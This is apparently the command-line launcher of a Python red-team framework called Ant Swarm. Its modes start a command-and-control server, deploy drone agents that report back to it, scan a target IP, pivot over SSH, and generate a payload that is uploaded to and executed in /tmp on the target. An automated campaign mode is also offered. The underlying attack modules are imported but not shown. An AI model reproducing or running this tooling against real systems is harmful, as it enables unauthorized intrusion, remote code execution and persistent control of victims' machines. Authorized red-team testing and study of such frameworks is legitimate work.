#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import os
from rich.console import Console
from rich.panel import Panel

# Import internal modules
from ant_swarm.c2.server import OvermindServer
from ant_swarm.c2.drone import Drone
from ant_swarm.red.campaign import AutoRecon
from ant_swarm.red.pivot import PivotTunnel
from ant_swarm.red.exploit_gen import ExploitSynthesizer
from ant_swarm.red.strategist import Strategist
from ant_swarm.core.swarm_link import SwarmLink
from ant_swarm.red.hardened_target_sim import HardenedTarget

console = Console()

def banner():
    console.print(Panel("""[bold red]
    🐜 ANT SWARM v1.0 🐜
    Distributed Red Team Intelligence Framework
    [/]""", expand=False))

def cmd_server(args):
    console.print("[CLI] 🛰️ Launching C2 Overmind...")
    server = OvermindServer(port=args.port)
    server.start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        server.stop()

def cmd_drone(args):
    console.print(f"[CLI] 🚀 Deploying Drone to connect to {args.c2}...")
    drone = Drone(c2_url=args.c2)
    drone.deploy()

def cmd_attack(args):
    console.print("[CLI] ⚔️ Interactive Red Team Attack Mode")
    target = args.target
    if not target:
        from rich.prompt import Prompt
        target = Prompt.ask("Target IP")

    recon = AutoRecon(target)
    pivot = PivotTunnel()
    exploit_gen = ExploitSynthesizer()

    # 1. Recon
    recon._scan_network(target)

    # 2. Pivot
    if args.ssh_user:
        pivot.add_ssh_pivot(target, args.ssh_user) # Pass auth if we had args for it

    # 3. Payload
    exploit_gen.generate_recon_payload("payload.py")
    if pivot.ssh_client:
        pivot.upload_and_exec("payload.py", "/tmp/payload.py")
    else:
        console.print("[CLI] No active pivot for upload.")

def cmd_campaign(args):
    console.print("[CLI] 🗺️ Automated Campaign Mode")
    recon = AutoRecon(os.getcwd())
    pivot = PivotTunnel() # Default
    strategist = Strategist(recon, pivot)
    strategist.execute_advanced_campaign()

def cmd_demo(args):
    console.print("[CLI] 🎭 Running Full Hive Net Simulation...")
    # Import the logic from the old run_hive_net.py
    # Re-implementing simplified here
    c2 = OvermindServer(port=8080)
    c2.start()
    time.sleep(1)

    threads = []
    for i in range(5):
        d = Drone(c2_url="http://localhost:8080")
        t = threading.Thread(target=d.deploy)
        threads.append(t)
        t.start()
        time.sleep(0.1)

    for t in threads: t.join()
    time.sleep(1)
    c2.stop()

def main():
    banner()
    parser = argparse.ArgumentParser(description="Ant Swarm CLI")
    subparsers = parser.add_subparsers(dest="command", help="Mode of operation")

    # Server
    p_server = subparsers.add_parser("server", help="Start C2 Server")
    p_server.add_argument("--port", type=int, default=8080)

    # Drone
    p_drone = subparsers.add_parser("drone", help="Deploy Drone Agent")
    p_drone.add_argument("--c2", type=str, default="http://localhost:8080")

    # Attack
    p_attack = subparsers.add_parser("attack", help="Manual Attack")
    p_attack.add_argument("--target", type=str, help="Target IP")
    p_attack.add_argument("--ssh-user", type=str)

    # Campaign
    p_campaign = subparsers.add_parser("campaign", help="Automated Strategist")

    # Demo
    p_demo = subparsers.add_parser("demo", help="Run Simulation")

    args = parser.parse_args()

    if args.command == "server": cmd_server(args)
    elif args.command == "drone": cmd_drone(args)
    elif args.command == "attack": cmd_attack(args)
    elif args.command == "campaign": cmd_campaign(args)
    elif args.command == "demo": cmd_demo(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
